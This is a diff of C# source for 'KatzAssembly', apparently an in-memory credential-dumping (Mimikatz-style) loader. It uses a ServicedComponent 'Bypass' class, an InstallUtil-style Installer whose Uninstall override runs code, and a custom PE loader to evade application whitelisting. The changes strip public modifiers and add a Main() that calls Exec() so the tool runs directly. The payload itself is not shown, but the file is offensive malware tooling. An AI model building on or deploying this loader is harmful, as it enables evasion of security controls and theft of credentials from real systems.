@@ -9,7 +9,7 @@ using System.Threading.Tasks;
 namespace KatzAssembly
 {
 
-    public class Bypass : ServicedComponent
+    class Bypass : ServicedComponent
     {
 
         [ComRegisterFunction] //This executes if registration is successful
@@ -43,7 +43,7 @@ namespace KatzAssembly
 
 
     [System.ComponentModel.RunInstaller(true)]
-    public class Sample : System.Configuration.Install.Installer
+    class Sample : System.Configuration.Install.Installer
     {
         //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
         public override void Uninstall(System.Collections.IDictionary savedState)
@@ -70,6 +70,11 @@ namespace KatzAssembly
         private static extern void SetStdHandle(UInt32 nStdHandle, IntPtr handle);
         [DllImport("kernel32")]
         static extern bool AllocConsole();
+
+        public static void Main()
+        {
+            Exec();
+        }
 
         public static void Exec()
         {
@@ -332,7 +337,7 @@ namespace KatzAssembly
 
     }//End Program
 
-    public class PELoader
+    class PELoader
     {
         public struct IMAGE_DOS_HEADER
         {      // DOS .EXE header
@@ -758,7 +763,7 @@ namespace KatzAssembly
         
     }
 
-    public class Misc
+    class Misc
     {
         private static byte[] PerformCryptography(ICryptoTransform cryptoTransform, byte[] data)
         {
